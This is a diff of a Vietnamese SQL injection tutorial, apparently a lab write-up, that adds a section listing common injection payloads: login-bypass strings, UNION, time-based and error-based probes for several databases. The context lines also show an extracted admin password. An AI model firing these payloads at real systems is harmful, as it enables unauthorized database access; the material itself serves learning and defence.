@@ -385,6 +385,7 @@ Một lúc sau, sẽ thấy có các request DNS/HTTP trả về từ server. Tr
 - Vậy mật khẩu admin là : 63r0abq1y0g7d07g1r58
 - Vào mục My account, đăng nhập với username administrator và mật khẩu vừa lấy được → Đăng nhập thành công.
 <img width="1862" height="803" alt="image" src="https://github.com/user-attachments/assets/682dfce8-1eb7-45b6-8a7f-1a1827c4cda1" />
+
 ## 4. Các biện pháp phòng chống SQL Injection
 
 Để tránh SQL Injection, có thể áp dụng các biện pháp sau:
@@ -404,4 +405,42 @@ Một lúc sau, sẽ thấy có các request DNS/HTTP trả về từ server. Tr
   Như vậy, kể cả khi bị tấn công cũng hạn chế được rủi ro.
 - **Backup dữ liệu thường xuyên**  
   Đảm bảo khi gặp sự cố hoặc bị tấn công, có thể nhanh chóng khôi phục lại dữ liệu.
+
+## 5. Một số wordlist payload liên quan đến SQL Injection
+
+Khi khai thác SQL Injection, các payload thường được tập hợp thành **wordlist** để brute-force hoặc fuzz.  
+Dưới đây là một số payload phổ biến:
+
+- **Kiểm tra lỗi cú pháp**
+  - `'`
+  - `''`
+  - `" OR "1"="1`
+  - `' OR '1'='1`
+  - `') OR ('1'='1`
+
+- **Bypass đăng nhập**
+  - `' OR 1=1--`
+  - `' OR 1=1#`
+  - `' OR 'a'='a'--`
+  - `" OR "a"="a"--`
+
+- **Union-based SQLi**
+  - `' UNION SELECT NULL--`
+  - `' UNION SELECT NULL,NULL--`
+  - `' UNION SELECT 1,2,3--`
+
+- **Time-based Blind SQLi**
+  - `' OR SLEEP(5)--` (MySQL)
+  - `'; WAITFOR DELAY '0:0:5'--` (SQL Server)
+  - `'||pg_sleep(5)--` (PostgreSQL)
+
+- **Error-based SQLi**
+  - `' AND 1=CONVERT(int, 'text')--` (SQL Server)
+  - `' AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--` (MySQL)
+  - `' || (SELECT to_char(1/0))--` (Oracle)
+
+- **Comment để bypass**
+  - `--`
+  - `#`
+  - `/* ... */`
 
